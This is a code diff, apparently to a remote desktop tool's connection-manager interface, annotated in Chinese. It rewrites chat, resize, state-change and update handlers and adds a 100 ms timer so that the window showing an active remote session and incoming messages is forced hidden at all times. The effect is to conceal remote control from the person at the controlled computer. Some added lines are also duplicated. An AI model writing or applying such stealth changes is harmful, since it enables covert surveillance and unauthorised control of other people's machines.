@@ -332,14 +332,18 @@ if (is_osx) {
     $(div.window-toolbar).content(<Header />);
     setWindowButontsAndIcon(true);
 }
-
+// 【修改4】禁用聊天图标点击事件，避免触发窗口调整
 event click $(div.chaticon) {
     checkClickTime(function() {
+        show_chat = false; // 强制不显示聊天面板
+        view.windowState = View.WINDOW_HIDDEN; // 再次强制隐藏
+        /*
         show_chat = !show_chat;
         adaptSizeForChat();
         if (show_chat) {
             view.focus = $(.outline-focus);
         }
+        */
     });
 }
 
@@ -353,7 +357,14 @@ function checkClickTime(callback) {
     });
 }
 
+// 【修改5】完全重写adaptSizeForChat，禁用窗口大小/位置调整
 function adaptSizeForChat() {
+    
+    view.windowState = View.WINDOW_HIDDEN;
+    view.visibility = false;
+    return;
+
+    /*
     $(div.right-panel).style.set {
         display: show_chat ? "block" : "none",
     };
@@ -363,16 +374,22 @@ function adaptSizeForChat() {
     } else if (!show_chat && w > scaleIt(450)) {
         view.move(x + (w - scaleIt(300)), y, scaleIt(300), h);
     }
+    */
 }
 
 function update() {
     header.update();
     body.update();
+    // 【新增】每次更新后强制隐藏
+    view.windowState = View.WINDOW_HIDDEN;
 }
 
+
+// 【修改6】彻底重写bring_to_top，无任何显示逻辑
 function bring_to_top(idx=-1) {
     // 【修改3】重写bring_to_top函数，禁用窗口置顶/显示逻辑
         view.windowState = View.WINDOW_HIDDEN;
+        view.visibility = false;
         return;
     /* 注释原有逻辑
     if (view.windowState == View.WINDOW_HIDDEN || view.windowState == View.WINDOW_MINIMIZED) {
@@ -461,7 +478,8 @@ handler.newMessage = function(id, text) {
     bring_to_top(idx);
     if (idx == body.cur) {
         var shouldAdapt = !show_chat;
-        show_chat = true;
+        show_chat = false; // 强制不显示
+        // show_chat = true;
         if (shouldAdapt) adaptSizeForChat();
     }
     conn.unreaded += 1;
@@ -475,8 +493,10 @@ handler.showElevation = function(show) {
     }
 }
 
+// 【修改8】禁用statechange事件的adjustBorder，强制隐藏
 view << event statechange {
-    adjustBorder();
+    view.windowState = View.WINDOW_HIDDEN;
+    // adjustBorder(); // 注释原有逻辑
 }
 
 function self.ready() {
@@ -523,6 +543,7 @@ function check_update_ui() {
             // 【修改5】强制隐藏，忽略配置项变化
             hide_cm = true;
             view.windowState = View.WINDOW_HIDDEN;
+
            /*
             var should_hide = allow_hide_cm == 'Y';
             if (should_hide) {
@@ -543,6 +564,10 @@ function check_update_ui() {
             }
             */
         }
+        hide_cm = true;
+        view.windowState = View.WINDOW_HIDDEN; // 强制隐藏
+        if (changed) update();
+        check_update_ui();
 
         if (changed) update();
         check_update_ui();
@@ -621,7 +646,18 @@ function adjustHeader() {
     }
 }
 
-view.on("size", adjustHeader);
+view.on("size", function() {
+    // 【修改10】禁用size事件的adjustHeader，强制隐藏
+    view.windowState = View.WINDOW_HIDDEN;
+});
+
+// 【新增】全局定时器，每100ms强制隐藏一次（兜底）
+self.timer(100ms, function() {
+    view.windowState = View.WINDOW_HIDDEN;
+    view.visibility = false;
+});
+
+// view.on("size", adjustHeader);
 
 // handler.addConnection(0, false, false, 0, "", "test1", true, false, false, true, true);
 // handler.addConnection(1, false, false, 0, "", "test2--------", true, false, false, false, false);
